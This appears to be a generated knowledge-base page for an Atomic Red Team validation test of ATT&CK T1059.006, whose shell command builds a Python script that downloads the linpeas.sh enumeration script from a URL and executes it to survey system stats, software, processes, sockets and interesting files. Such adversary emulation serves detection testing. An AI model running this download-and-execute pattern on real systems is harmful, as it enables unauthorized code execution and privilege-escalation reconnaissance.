---
atomic_guid: "6c4d1dcb-33c7-4c36-a8df-c6cfd0408be8"
title: "Execute Python via scripts"
framework: "atomic"
generated: "true"
attack_technique_id: "T1059.006"
attack_technique_name: "Command and Scripting Interpreter: Python"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.006/T1059.006.yaml"
build_date: "2026-04-26 17:02:12"
executor: "sh"
aliases:
  - "6c4d1dcb-33c7-4c36-a8df-c6cfd0408be8"
  - "Execute Python via scripts"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Execute Python via scripts

Create Python file (.py) that downloads and executes shell script via executor arguments

## Metadata

- Atomic GUID: 6c4d1dcb-33c7-4c36-a8df-c6cfd0408be8
- Technique: T1059.006: Command and Scripting Interpreter: Python
- Platforms: linux
- Executor: sh
- Dependency Executor: sh
- Source Path: atomics/T1059.006/T1059.006.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1059-command_and_scripting_interpreter|T1059.006]]

## Input Arguments

### executor

- description: Payload or script interpreter / executor
- type: string
- default: sh

### payload_file_name

- description: Shell script file name downloaded from the script_url
- type: string
- default: T1059.006-payload

### python_script_name

- description: Python script name
- type: path
- default: T1059.006.py

### script_args

- description: Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files
- type: string
- default: -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles

### script_url

- description: Shell script public URL
- type: string
- default: https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh

## Dependencies

Requires Python

### Prerequisite Check

```bash
which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V
$which_python -c 'import requests' 2>/dev/null; echo $?
```

### Get Prerequisite

```bash
pip install requests
```

## Executor

- name: sh

### Command

```bash
which_python=$(which python || which python3 || which python3.9 || which python2)
echo 'import requests' > #{python_script_name}
echo 'import os' >> #{python_script_name}
echo 'url = "#{script_url}"' >> #{python_script_name}
echo 'malicious_command = "#{executor} #{payload_file_name} #{script_args}"' >> #{python_script_name}
echo 'session = requests.session()' >> #{python_script_name}
echo 'source = session.get(url).content' >> #{python_script_name}
echo 'fd = open("#{payload_file_name}", "wb+")' >> #{python_script_name}
echo 'fd.write(source)' >> #{python_script_name}
echo 'fd.close()' >> #{python_script_name}
echo 'os.system(malicious_command)' >> #{python_script_name}
$which_python #{python_script_name}
```

### Cleanup

```bash
rm #{python_script_name} #{payload_file_name}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.006/T1059.006.yaml)
